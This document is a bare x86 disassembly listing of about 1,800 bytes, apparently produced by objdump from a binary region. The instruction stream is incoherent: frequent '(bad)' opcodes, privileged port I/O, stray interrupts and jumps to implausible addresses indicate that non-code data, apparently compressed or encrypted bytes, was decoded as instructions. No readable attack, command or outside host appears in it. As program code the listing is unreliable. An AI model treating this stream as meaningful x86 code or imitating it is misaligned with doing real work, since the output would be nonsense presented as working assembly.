  41944a:	imul   eax,DWORD PTR [ecx],0x31
  41944d:	mov    dl,BYTE PTR [esp+eiz*2+0x3d512918]
  419454:	jno    0x419492
  419456:	cmp    BYTE PTR [edx+0x4451b624],bl
  41945c:	lods   al,BYTE PTR ds:[esi]
  41945d:	jecxz  0x41946f
  41945f:	lods   al,BYTE PTR ds:[esi]
  419460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419461:	shl    DWORD PTR [eax-0x34936e08],1
  419467:	out    0x20,eax
  419469:	pop    es
  41946a:	andnps xmm2,xmm0
  41946d:	stos   BYTE PTR es:[edi],al
  41946e:	sub    eax,0xf12d9aaa
  419473:	(bad)  
  419474:	fimul  DWORD PTR [ebx+0x7]
  419477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419478:	and    edi,0xf9aa9191
  41947e:	rcr    BYTE PTR [ebp-0x66617667],0xcc
  419485:	xchg   esi,eax
  419486:	mov    ch,0xe2
  419488:	in     al,dx
  419489:	jmp    0x419455
  41948b:	fnstcw WORD PTR [ebp+ebp*4+0x3b]
  41948f:	push   0xffffffa9
  419491:	sbb    ebx,DWORD PTR [edi]
  419493:	or     bh,ah
  419495:	xchg   BYTE PTR [eax],ah
  419497:	xchg   edi,eax
  419498:	xor    eax,0x4321f126
  41949d:	sbb    ecx,0xc4263678
  4194a3:	rcl    DWORD PTR [esp+ecx*2+0x60a114a7],cl
  4194aa:	in     al,dx
  4194ab:	sbb    DWORD PTR [ecx+0x8659593],esi
  4194b1:	ficomp WORD PTR [eax-0x28d88179]
  4194b7:	jl     0x419461
  4194b9:	addr16 or bl,0xf5
  4194bd:	cmp    BYTE PTR [esp+eax*4+0x62a1f4ba],ah
  4194c4:	mov    dh,0xe3
  4194c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c7:	leave  
  4194c8:	mov    ecx,0x94ce3869
  4194cd:	jp     0x4194f6
  4194cf:	(bad)  
  4194d0:	popf   
  4194d1:	pushf  
  4194d2:	dec    eax
  4194d3:	jbe    0x419530
  4194d5:	mov    esi,0x51a4ba58
  4194da:	mov    ds:0x821715ef,eax
  4194df:	repnz sti 
  4194e1:	mov    WORD PTR [ecx-0x6aab064e],gs
  4194e7:	pop    ecx
  4194e8:	jle    0x4194c1
  4194ea:	ins    DWORD PTR es:[edi],dx
  4194eb:	mov    ah,0x2e
  4194ed:	dec    esi
  4194ee:	mov    dh,0x97
  4194f0:	shl    BYTE PTR [eax],1
  4194f2:	mov    eax,0x279e028f
  4194f7:	pop    ecx
  4194f8:	sub    eax,0x3d2ab312
  4194fd:	and    ebp,DWORD PTR [ecx+ebx*4+0x3228c698]
  419504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419505:	xlat   BYTE PTR ds:[ebx]
  419506:	xor    al,0x93
  419508:	xor    al,0x65
  41950a:	xchg   edx,eax
  41950b:	or     al,0x95
  41950d:	int3   
  41950e:	push   ebx
  41950f:	or     DWORD PTR [eax+ebx*8-0x3e],eax
  419513:	stc    
  419514:	mov    cl,0x2b
  419516:	sbb    dh,BYTE PTR [eax+edi*2+0x1655036f]
  41951d:	inc    edx
  41951e:	jl     0x4194e3
  419520:	mov    dl,0x29
  419522:	lahf   
  419523:	jge    0x41954f
  419525:	ins    BYTE PTR es:[edi],dx
  419526:	cmp    al,BYTE PTR [ebx]
  419528:	add    ch,dh
  41952a:	lock aam 0x5f
  41952d:	std    
  41952e:	pusha  
  41952f:	push   cs
  419530:	xchg   ebx,eax
  419531:	and    DWORD PTR [ebp-0x59],eax
  419534:	sbb    al,0x0
	...
  419596:	scas   eax,DWORD PTR es:[edi]
  419597:	aam    0x8d
  419599:	(bad)  
  41959a:	(bad)  
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	idiv   cl
  4195a3:	adc    esp,DWORD PTR [ebx+ecx*4-0x7d]
  4195a7:	or     al,BYTE PTR [ecx]
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [esi],cl
  4195af:	mov    ebx,0x151ded0e
  4195b4:	inc    BYTE PTR [edi]
  4195b6:	cs xchg ecx,eax
  4195b8:	int    0xa0
  4195ba:	rcr    ecx,0xb9
  4195bd:	icebp  
  4195be:	imul   ebx,DWORD PTR [edi-0x68445da3],0x4
  4195c5:	cwde   
  4195c6:	add    DWORD PTR [ebx+0x1a7c6d63],ecx
  4195cc:	or     eax,DWORD PTR [eax-0x7c]
  4195cf:	ins    DWORD PTR es:[edi],dx
  4195d0:	retf   0x386f
  4195d3:	dec    ecx
  4195d4:	jmp    0x2f5418b6
  4195d9:	push   0xffffff99
  4195db:	aas    
  4195dc:	mov    esp,0x44a4c92
  4195e1:	cmp    DWORD PTR ds:0xeb81662d,ebx
  4195e7:	pop    ds
  4195e8:	or     ebx,DWORD PTR [esi-0x71]
  4195eb:	fstp   TBYTE PTR [esp+eiz*2+0x38]
  4195ef:	es cmp dh,dl
  4195f2:	dec    ebx
  4195f3:	mov    BYTE PTR [ecx],bl
  4195f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f6:	sar    DWORD PTR [ecx],cl
  4195f8:	call   0x81a0:0x911c7902
  4195ff:	sbb    DWORD PTR [edx],ecx
  419601:	test   ch,bh
  419603:	in     al,dx
  419604:	xchg   edx,eax
  419605:	dec    eax
  419606:	jl     0x419588
  419608:	push   eax
  419609:	clc    
  41960a:	sub    bh,BYTE PTR [esi+0x49]
  41960d:	sbb    al,0x67
  41960f:	enter  0x2384,0x4d
  419613:	adc    al,0xf4
  419615:	cmp    DWORD PTR [eax+ebp*4-0x5e54a2ef],esi
  41961c:	loope  0x4195ec
  41961e:	sub    DWORD PTR [ebp-0x3b],ebp
  419621:	jg     0x41968d
  419623:	jl     0x419662
  419625:	push   ss
  419626:	cmc    
  419627:	jae    0x419642
  419629:	xchg   ecx,eax
  41962a:	pop    ds
  41962b:	and    DWORD PTR [edi],edi
  41962d:	adc    al,0xbb
  41962f:	dec    esp
  419630:	mov    dh,0xf5
  419632:	push   ds
  419633:	xor    BYTE PTR [edx-0x2e],bl
  419636:	adc    edx,DWORD PTR [edx+0x15]
  419639:	out    dx,eax
  41963a:	push   esi
  41963b:	(bad)  
  41963c:	(bad)  
  41963d:	(bad)  
  41963e:	loope  0x41962d
  419640:	push   esp
  419641:	add    al,0x72
  419643:	addr16 int3 
  419645:	loopne 0x4195fc
  419647:	jns    0x4196a7
  419649:	aas    
  41964a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41964b:	lds    edx,FWORD PTR [esi-0x51]
  41964e:	lock into 
  419650:	jo     0x4195d6
  419652:	sti    
  419653:	int    0x91
  419655:	sbb    dh,dh
  419657:	xor    al,0x2a
  419659:	(bad)  
  41965a:	pop    esp
  41965b:	aam    0xe1
  41965d:	out    0x7d,al
  41965f:	push   cs
  419660:	fld    DWORD PTR [eax]
  419662:	ins    DWORD PTR es:[edi],dx
  419663:	pop    esp
  419664:	das    
  419665:	(bad)  
  419666:	or     DWORD PTR [ebx+0x64],esp
  419669:	int3   
  41966a:	je     0x419643
  41966c:	mov    esi,0xce9ac5b9
  419671:	int    0xf
  419673:	ins    DWORD PTR es:[edi],dx
  419674:	aas    
  419675:	pop    edi
  419676:	pop    es
  419677:	sub    BYTE PTR [edx],dl
  419679:	loop   0x4196b8
  41967b:	inc    eax
  41967c:	adc    BYTE PTR [edi],dl
  41967e:	rcl    eax,0x93
  419681:	retf   
  419682:	das    
  419683:	(bad)  
  419684:	fisubr WORD PTR [edi+0x1d]
  419687:	pop    edx
  419688:	fdivr  QWORD PTR [ebx-0x20]
  41968b:	mov    dl,BYTE PTR [esi-0x54a8a3a9]
  419691:	ins    BYTE PTR es:[edi],dx
  419692:	fidiv  WORD PTR [ecx-0x2a]
  419695:	or     BYTE PTR [ebx+0x15422f29],0xa0
  41969c:	pop    edx
  41969d:	jns    0x4196b7
  41969f:	dec    eax
  4196a0:	and    esp,eax
  4196a2:	in     al,0x9c
  4196a4:	adc    al,0xff
  4196a6:	mov    ah,0x15
  4196a8:	das    
  4196a9:	and    eax,eax
  4196ab:	cmp    al,0xaf
  4196ad:	fwait
  4196ae:	shr    BYTE PTR [ebx-0x72],cl
  4196b1:	xchg   ecx,eax
  4196b2:	(bad)  [ecx+0xea]
	...
  419714:	add    BYTE PTR [eax],al
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	push   cs
  419723:	outs   dx,BYTE PTR ds:[esi]
  419724:	rol    BYTE PTR [ecx+0x10b8a],0x7
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [edi],dl
  41972f:	xor    ecx,DWORD PTR [esi+0x34]
  419732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419733:	aam    0x52
  419735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419736:	sbb    BYTE PTR [eax],bl
  419738:	add    ch,BYTE PTR [ecx]
  41973a:	loop   0x4197bb
  41973c:	popf   
  41973d:	aad    0xf1
  41973f:	scas   al,BYTE PTR es:[edi]
  419740:	push   ds
  419741:	icebp  
  419742:	xor    BYTE PTR [eax+eax*4-0x4821a30d],dh
  419749:	pop    ecx
  41974a:	jmp    0xf6ea729e
  41974f:	xchg   ebp,eax
  419750:	add    eax,eax
  419752:	mov    ecx,0xce82d5e9
  419757:	xchg   ebx,eax
  419758:	pop    es
  419759:	sbb    dl,BYTE PTR [edi]
  41975b:	repz jno 0x419709
  41975e:	fnstenv [esi+0x620ac2f8]
  419764:	in     al,0x8
  419766:	(bad)  
  419767:	sbb    eax,0x7a2ce8fc
  41976c:	add    bl,ch
  41976e:	xchg   ecx,eax
  41976f:	mov    cl,0x49
  419771:	in     eax,0x9e
  419773:	ret    0x539b
  419776:	jnp    0x419700
  419778:	outs   dx,DWORD PTR ds:[esi]
  419779:	cmp    dl,BYTE PTR [ebx+0xd]
  41977c:	stc    
  41977d:	push   ss
  41977e:	and    BYTE PTR [edi+0x289f53c3],0x17
  419785:	pop    ebx
  419786:	fdiv   st(1),st
  419788:	mov    BYTE PTR [esi+0x4],dh
  41978b:	push   cs
  41978c:	cmc    
  41978d:	pop    esp
  41978e:	cmp    dh,BYTE PTR [ecx+0x3c]
  419791:	retf   0xd051
  419794:	adc    BYTE PTR [edi-0x4495776],cl
  41979a:	iret   
  41979b:	cmp    eax,0xe2b35385
  4197a0:	fist   DWORD PTR [esi]
  4197a2:	lods   al,BYTE PTR ds:[esi]
  4197a3:	add    eax,0x3229ee22
  4197a8:	aad    0x58
  4197aa:	xor    edi,DWORD PTR [ecx+0x1e]
  4197ad:	bound  edi,QWORD PTR [ebx]
  4197af:	push   es
  4197b0:	sti    
  4197b1:	fstp   DWORD PTR [ebp+0x7d]
  4197b4:	inc    edi
  4197b5:	jae    0x419757
  4197b7:	mov    ecx,0xbacadb6
  4197bc:	sbb    DWORD PTR [esi-0x38245051],ecx
  4197c2:	sub    cl,BYTE PTR [esi+0x60]
  4197c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c6:	cmp    al,0x5e
  4197c8:	add    ebp,eax
  4197ca:	mov    eax,0x4f05d3cf
  4197cf:	test   eax,0x47e63d47
  4197d4:	push   ebx
  4197d5:	test   BYTE PTR ds:0x5f6556c5,ah
  4197db:	mov    al,0xa0
  4197dd:	ds call 0x23dfab2d
  4197e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e4:	xchg   ecx,eax
  4197e5:	jb     0x419806
  4197e7:	xor    al,0x75
  4197e9:	and    ebp,DWORD PTR [ebx+eax*8]
  4197ec:	cmp    BYTE PTR [edx-0x11],0x9e
  4197f0:	outs   dx,DWORD PTR ds:[esi]
  4197f1:	cmp    BYTE PTR [esi-0x16],bl
  4197f4:	sub    esp,ecx
  4197f6:	mov    ch,0x73
  4197f8:	(bad)  
  4197f9:	mov    ch,0x67
  4197fb:	fsub   DWORD PTR ds:0x9a16e70
  419801:	jae    0x419815
  419803:	sub    DWORD PTR [ecx+0x53],eax
  419806:	and    al,0xd7
  419808:	sbb    al,BYTE PTR [esi-0x303bc3c]
  41980e:	js     0x4197a3
  419810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419811:	or     cl,BYTE PTR [esi+edi*8+0x44b276e6]
  419818:	xchg   ebp,eax
  419819:	mov    ebp,0xbe9d6de5
  41981e:	pop    ebx
  41981f:	outs   dx,BYTE PTR ds:[esi]
  419820:	mov    ebx,0x9ea3babc
  419825:	cli    
  419826:	inc    edx
  419827:	mov    bh,0xce
  419829:	sub    ah,BYTE PTR [ebx-0x253c982c]
  41982f:	push   ecx
  419830:	arpl   bp,si
  419832:	sub    ebp,DWORD PTR [ecx]
  419834:	inc    ebp
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fcmovb st,st(5)
  4198a3:	sbb    eax,0xc91300a
  4198a8:	add    DWORD PTR [eax],eax
  4198aa:	pop    es
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [edx],bh
  4198af:	stos   BYTE PTR es:[edi],al
  4198b0:	pop    eax
  4198b1:	stc    
  4198b2:	fdiv   st,st(4)
  4198b4:	add    dh,bl
  4198b6:	out    0x36,eax
  4198b8:	dec    eax
  4198b9:	out    dx,eax
  4198ba:	adc    ch,dh
  4198bc:	push   ebx
  4198bd:	aam    0xd1
  4198bf:	xchg   edi,eax
  4198c0:	push   ss
  4198c1:	push   edi
  4198c2:	mov    dl,0x2a
  4198c4:	pop    ss
  4198c5:	push   esp
  4198c6:	push   ebp
  4198c7:	in     eax,0xba
  4198c9:	jo     0x419915
  4198cb:	cmp    BYTE PTR [edi-0x7b08a809],dl
  4198d1:	xchg   DWORD PTR [edx],ebp
  4198d3:	adc    bh,al
  4198d5:	add    eax,0x6d5b03a1
  4198da:	adc    ch,dl
  4198dc:	jecxz  0x4198fe
  4198de:	bswap  ecx
  4198e0:	mov    BYTE PTR ds:0x67ee06af,ch
  4198e6:	jno    0x4198d5
  4198e8:	and    DWORD PTR [edx-0x23a9a29d],ebp
  4198ee:	sar    DWORD PTR [esi],1
  4198f0:	inc    edx
  4198f1:	sub    dh,BYTE PTR [edi+0x65]
  4198f4:	scas   eax,DWORD PTR es:[edi]
  4198f5:	jp     0x419970
  4198f7:	push   ebp
  4198f8:	aaa    
  4198f9:	inc    edi
  4198fa:	cmp    BYTE PTR [esi+0x56],0xe2
  4198fe:	shl    esp,0x76
  419901:	xchg   esi,eax
  419902:	gs jmp 0x419945
  419905:	mov    esi,0x24024bac
  41990a:	push   0xad0daa8f
  41990f:	cwde   
  419910:	pop    ss
  419911:	mov    esi,0xb32e8a2
  419916:	fdivr  DWORD PTR [ebp+0x52445c53]
  41991c:	sbb    BYTE PTR [esi+ebx*2],ch
  41991f:	lahf   
  419920:	sub    eax,0x43346702
  419925:	ror    DWORD PTR [esi-0x39],1
  419928:	cli    
  419929:	sub    al,0x58
  41992b:	or     edx,DWORD PTR [esi]
  41992d:	ret    0xacd
  419930:	cmp    DWORD PTR [edx],0x6464a8ab
  419936:	stos   DWORD PTR es:[edi],eax
  419937:	add    eax,0xd32ecb33
  41993c:	aas    
  41993d:	add    eax,DWORD PTR [edx]
  41993f:	pop    edx
  419940:	frstor [eax]
  419942:	inc    eax
  419943:	clc    
  419944:	adc    ecx,ecx
  419946:	cmp    cl,BYTE PTR [eax+edi*2]
  419949:	iret   
  41994a:	and    al,0x4b
  41994c:	xor    bl,BYTE PTR [esi-0xd]
  41994f:	int    0xd6
  419951:	xor    ecx,ecx
  419953:	sbb    BYTE PTR [ebp+0x14],0xbc
  419957:	push   edx
  419958:	push   ebp
  419959:	pop    es
  41995a:	into   
  41995b:	dec    edx
  41995c:	push   ecx
  41995d:	fadd   DWORD PTR [edx+edx*4]
  419960:	jl     0x419938
  419962:	pop    ecx
  419963:	push   0xe5152b52
  419968:	je     0x41997c
  41996a:	pop    eax
  41996b:	xor    cl,ch
  41996d:	fs dec ebx
  41996f:	push   esi
  419970:	bnd jb 0x41995c
  419973:	mov    dl,dl
  419975:	stos   BYTE PTR es:[edi],al
  419976:	jnp    0x419928
  419978:	xchg   esp,eax
  419979:	loopne 0x4199c0
  41997b:	sbb    DWORD PTR [edi+eax*2-0x1f649633],0xffffffd4
  419983:	mov    edx,0xc401a4db
  419988:	mov    WORD PTR [ebx+0x47],?
  41998b:	jne    0x4199a2
  41998d:	sub    BYTE PTR [ecx-0x59],0x11
  419991:	rol    BYTE PTR [esi+0x51],cl
  419994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419995:	dec    ebx
  419996:	icebp  
  419997:	in     al,0xa8
  419999:	popa   
  41999a:	mov    al,ds:0xd879dda3
  41999f:	out    dx,al
  4199a0:	push   esp
  4199a1:	in     eax,0xf2
  4199a3:	push   es
  4199a4:	imul   esi,edi,0x6dce9600
  4199aa:	daa    
  4199ab:	arpl   WORD PTR [ecx-0x287643f],di
  4199b1:	and    BYTE PTR [ebp-0x48],dl
	...
  419a14:	add    BYTE PTR [eax],al
  419a16:	xor    esi,DWORD PTR [ecx]
  419a18:	xchg   ebx,eax
  419a19:	lds    edx,FWORD PTR [ebx+0x59f777e7]
  419a1f:	push   ss
  419a20:	mov    eax,ds:0xa67ffc09
  419a25:	call   0x107:0x10d98
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	and    ebp,eax
  419a30:	mov    ebp,DWORD PTR [esi+ebp*4]
  419a33:	jo     0x4199f4
  419a35:	push   ds
  419a36:	xor    DWORD PTR [esi+0x3b],edi
  419a39:	mov    ebp,DWORD PTR [ecx+0x4f77d051]
  419a3f:	int3   
  419a40:	fadd   DWORD PTR [edx-0x1cb6fecb]
  419a46:	or     ebp,eax
  419a48:	rep lods eax,DWORD PTR ds:[esi]
  419a4a:	idiv   DWORD PTR [edi]
  419a4c:	add    al,0x12
  419a4e:	js     0x419ac5
  419a50:	lahf   
  419a51:	pop    ebx
  419a52:	add    BYTE PTR [ebx-0x2d],0xf0
  419a56:	sbb    al,0x85
  419a58:	cmp    ah,ah
  419a5a:	test   BYTE PTR [ecx],0x2d
  419a5d:	fnsave [ecx-0x5060f67e]
  419a63:	xchg   ebx,eax
  419a64:	inc    ecx
  419a65:	lods   al,BYTE PTR ds:[esi]
  419a66:	(bad)  
  419a68:	leave  
  419a69:	cs inc edi
  419a6b:	sahf   
  419a6c:	test   al,0x84
  419a6e:	inc    esi
  419a6f:	mov    eax,ds:0x32d4b427
  419a74:	arpl   WORD PTR [eax+0x2bba89d1],bx
  419a7a:	into   
  419a7b:	dec    esi
  419a7c:	push   0xa2d784de
  419a81:	dec    ecx
  419a82:	mov    ch,0xa2
  419a84:	mov    edx,0x67bfd5
  419a89:	dec    edi
  419a8a:	jns    0x419a31
  419a8c:	jg     0x419aef
  419a8e:	sbb    bl,BYTE PTR [esi+0x1e]
  419a91:	fdiv   st,st(4)
  419a93:	retf   0x4674
  419a96:	sbb    al,BYTE PTR [edx+0x78d27bca]
  419a9c:	shr    DWORD PTR es:0xf8f7126,cl
  419aa3:	inc    ebx
  419aa4:	pop    edx
  419aa5:	mov    edx,DWORD PTR [ebx+0xa08b7bf]
  419aab:	imul   ecx,DWORD PTR [edi],0xffffff95
  419aae:	cmp    eax,0x58415c25
  419ab3:	xlat   BYTE PTR ds:[ebx]
  419ab4:	dec    ebx
  419ab5:	clc    
  419ab6:	call   0xe4c266f3
  419abb:	and    ch,BYTE PTR [ebx-0x530b2010]
  419ac1:	(bad)  
  419ac2:	mov    ds:0xba5378cd,al
  419ac7:	ror    BYTE PTR [edi+0x5],0xa2
  419acb:	jp     0x419ae1
  419acd:	xor    al,0x8b
  419acf:	or     eax,0x6a8e27c8
  419ad4:	xor    BYTE PTR [edx+0x2c],bh
  419ad7:	mov    edx,0xe1a314b5
  419adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419add:	popa   
  419ade:	test   al,0x3c
  419ae0:	mov    eax,ds:0xc7032990
  419ae5:	push   ebp
  419ae6:	jne    0x419a8e
  419ae8:	fist   DWORD PTR [ebx+esi*1-0x311168e3]
  419aef:	xor    ch,cl
  419af1:	test   eax,0xfea69137
  419af6:	test   al,0xee
  419af8:	inc    edi
  419af9:	popa   
  419afa:	adc    cl,BYTE PTR [edx-0xc0ee129]
  419b00:	test   al,0x29
  419b02:	push   0xdae8db5d
  419b07:	mov    esi,0x5cfa3548
  419b0c:	cmp    al,0x9e
  419b0e:	out    dx,eax
  419b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b10:	dec    edi
  419b11:	mov    ah,0xfd
  419b13:	leave  
  419b14:	repnz or ah,BYTE PTR [ebx+0x0]
  419b18:	xchg   BYTE PTR [eax-0x29],ch
  419b1b:	sbb    ebp,DWORD PTR [eax+0x4646618b]
  419b21:	sub    esi,DWORD PTR [edx-0x143ce872]
  419b27:	push   ebx
  419b28:	pop    edi
  419b29:	mov    ebp,0x1ae8e7f1
  419b2e:	mov    ebx,0xeed18e57
  419b33:	add    eax,0x52
	...
  419b94:	add    BYTE PTR [eax],al
  419b96:	dec    edx
  419b97:	(bad)  
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	and    al,0x69
  419ba4:	cwde   
  419ba5:	(bad)  
  419ba6:	lahf   
  419ba7:	push   cs
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [esi+0xa8f578b],cl
  419bb3:	fnsave [esi-0x5243eec]
  419bb9:	xor    eax,0x6424a5b1
  419bbe:	imul   eax,DWORD PTR [edi-0x79d6df6b],0x2a56311
  419bc8:	test   DWORD PTR [ebx-0x61d2a781],edx
  419bce:	stc    
  419bcf:	sbb    DWORD PTR [eax+0x3e],edx
  419bd2:	fidiv  DWORD PTR [edx+0x6a]
  419bd5:	xor    BYTE PTR [ecx],dl
  419bd7:	xchg   ecx,eax
  419bd8:	push   edi
  419bd9:	test   BYTE PTR [esi],ch
  419bdb:	jge    0x419b8f
  419bdd:	sub    edx,edx
  419bdf:	arpl   WORD PTR [ecx],cx
  419be1:	test   DWORD PTR [edi-0x4ee5fdff],0xf78761db
  419beb:	xchg   ecx,eax
  419bec:	pop    esp
  419bed:	inc    edx
  419bee:	popf   
  419bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bf1:	inc    ebx
  419bf2:	inc    ebx
  419bf3:	icebp  
  419bf4:	mov    dh,0x18
  419bf6:	jno    0x419bf2
  419bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bf9:	sbb    eax,0xb01744ab
  419bfe:	daa    
  419bff:	dec    ecx
  419c00:	and    al,0xbf
  419c02:	jne    0x419c62
  419c04:	fld    QWORD PTR [ebp*2+0x11b1e8fe]
  419c0b:	mov    edx,DWORD PTR [ebx+0x17934789]
  419c11:	out    0x25,eax
  419c13:	xchg   ebx,eax
  419c14:	(bad)  
  419c16:	clc    
  419c17:	push   cs
  419c18:	xchg   BYTE PTR [eax+eax*2-0x1f],al
  419c1c:	mov    eax,ds:0x7e02830e
  419c21:	pop    edx
  419c22:	mov    bl,0x4e
  419c24:	dec    ebx
  419c25:	jmp    0x419c68
  419c27:	std    
  419c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c29:	iret   
  419c2a:	and    eax,0xc8426ae3
  419c2f:	pop    edx
  419c30:	inc    edx
  419c31:	xchg   ebp,eax
  419c33:	or     ah,BYTE PTR [edi]
  419c35:	js     0x419c79
  419c37:	(bad)  
  419c38:	sbb    ebx,DWORD PTR [ecx+0x5c]
  419c3b:	fld    DWORD PTR [edx+0x65]
  419c3e:	sub    eax,0x3364a93b
  419c43:	xor    DWORD PTR [ebp+0x5a374b7f],0x40
  419c4a:	adc    ecx,DWORD PTR [esi]
  419c4c:	mov    ebp,0x67aae7ee
  419c51:	loope  0x419cd2
  419c53:	gs (bad) 
  419c55:	sbb    al,0x20
  419c57:	xor    esp,ebx
  419c59:	sub    al,0x3b
  419c5b:	jbe    0x419c32
  419c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5e:	mov    ebp,0x2dcc857f
  419c63:	adc    bl,BYTE PTR [esi]
  419c65:	mov    ah,BYTE PTR [edx-0x4]
  419c68:	dec    eax
  419c69:	sub    BYTE PTR [esi],bh
  419c6b:	call   0x8b2a:0x50df86fa
  419c72:	push   eax
  419c73:	inc    ecx
  419c74:	inc    ebp
  419c75:	push   edi
  419c76:	outs   dx,BYTE PTR ds:[esi]
  419c77:	push   ds
  419c78:	rcr    BYTE PTR [ebx],cl
  419c7a:	sti    
  419c7b:	adc    al,0xf2
  419c7d:	mov    al,ds:0x212c6d3a
  419c82:	sbb    DWORD PTR [ebx+ebx*2-0x33cae846],0x30f3de67
  419c8d:	lods   al,BYTE PTR ds:[esi]
  419c8e:	bound  ebp,QWORD PTR [esi]
  419c90:	add    cl,BYTE PTR [ebx-0xea892b5]
  419c96:	popf   
  419c97:	cli    
  419c98:	call   0x27fb290d
  419c9d:	call   0xd01214ed
  419ca2:	jmp    0x9873cc81
  419ca7:	xchg   ebp,eax
  419ca8:	push   ebp
  419ca9:	cwde   
  419caa:	in     eax,0x2b
  419cac:	lock std 
  419cae:	pop    edx
  419caf:	leave  
  419cb0:	ins    BYTE PTR es:[edi],dx
  419cb1:	call   0x8c4b31
	...
  419d16:	lock xchg edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0xe1e19c45
  419d24:	or     al,0x65
  419d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    ah,ah
  419d2f:	jmp    0xc5f828fa
  419d34:	es or  eax,0x8d71b911
  419d3a:	dec    esi
  419d3b:	inc    esi
  419d3c:	gs std 
  419d3e:	imul   edi,DWORD PTR [edx-0x67107bae],0xffffffff
  419d45:	test   ch,bh
  419d47:	int3   
  419d48:	test   DWORD PTR [ebp+esi*4+0x72ed9101],eax
  419d4f:	(bad)  
  419d50:	xchg   ecx,eax
  419d51:	inc    ebx
  419d52:	cld    
  419d53:	add    eax,0x62d95f3a
  419d58:	std    
  419d59:	icebp  
  419d5a:	jno    0x419d28
  419d5c:	xchg   ebx,eax
  419d5d:	push   cs
  419d5e:	aad    0xd9
  419d60:	fimul  WORD PTR ds:0x9da6c32c
  419d66:	test   al,0xc8
  419d68:	out    0x27,al
  419d6a:	loop   0x419d89
  419d6c:	in     eax,0xb2
  419d6e:	mov    edx,0x79b293ae
  419d73:	sbb    esp,DWORD PTR [eax-0x1b]
  419d76:	fisttp DWORD PTR ds:0x57ea65ba
  419d7c:	push   ss
  419d7d:	test   BYTE PTR [ebx],bl
  419d7f:	repz sbb BYTE PTR [eax+esi*4],0xaa
  419d84:	std    
  419d85:	mov    ecx,0x7e4d8dce
  419d8a:	jle    0x419dc7
  419d8c:	lods   al,BYTE PTR ds:[esi]
  419d8d:	sbb    dh,BYTE PTR [ecx-0x79]
  419d90:	repz pop esi
  419d92:	pop    es
  419d93:	test   al,0x4
  419d95:	adc    al,0x24
  419d97:	adc    DWORD PTR [esi+edx*8-0x3c],ebx
  419d9b:	pop    ds
  419d9c:	cmp    eax,0xbdc2c671
  419da1:	push   eax
  419da2:	mov    dh,0x45
  419da4:	aam    0x20
  419da6:	js     0x419dd7
  419da8:	stos   DWORD PTR es:[edi],eax
  419da9:	fild   DWORD PTR [edx+0x6e]
  419dac:	fdivr  QWORD PTR [esp+ebx*4-0x12]
  419db0:	daa    
  419db1:	jl     0x419d80
  419db3:	sbb    ebp,DWORD PTR [ebx+0x4c]
  419db6:	stos   DWORD PTR es:[edi],eax
  419db7:	loopne 0x419d46
  419db9:	jae    0x419dee
  419dbb:	scas   al,BYTE PTR es:[edi]
  419dbc:	repnz test al,0x2f
  419dbf:	sub    al,0x7c
  419dc1:	pop    ds
  419dc2:	dec    eax
  419dc3:	xor    al,0x70
  419dc5:	sub    DWORD PTR [ebx+0x39],esi
  419dc8:	fst    QWORD PTR [ecx+0x448e5b6]
  419dce:	mov    ebx,0x2bf9fc2d
  419dd3:	ja     0x419d80
  419dd5:	dec    ebp
  419dd6:	adc    al,0x4
  419dd8:	inc    edi
  419dd9:	pop    es
  419dda:	sub    bh,bh
  419ddc:	ror    bl,1
  419dde:	loop   0x419db7
  419de0:	seto   BYTE PTR [ecx-0x74]
  419de4:	cmp    BYTE PTR cs:[ebx-0x41],bl
  419de8:	scas   eax,DWORD PTR es:[edi]
  419de9:	imul   edx,DWORD PTR [esi+edx*1],0xffffffc2
  419ded:	sbb    ah,cl
  419def:	mov    ch,0xb2
  419df1:	aad    0x78
  419df3:	not    DWORD PTR [ecx-0x39]
  419df6:	mov    cl,0x46
  419df8:	and    ebx,DWORD PTR [ebx]
  419dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dfb:	test   al,0x20
  419dfd:	idiv   DWORD PTR [ecx-0x1f]
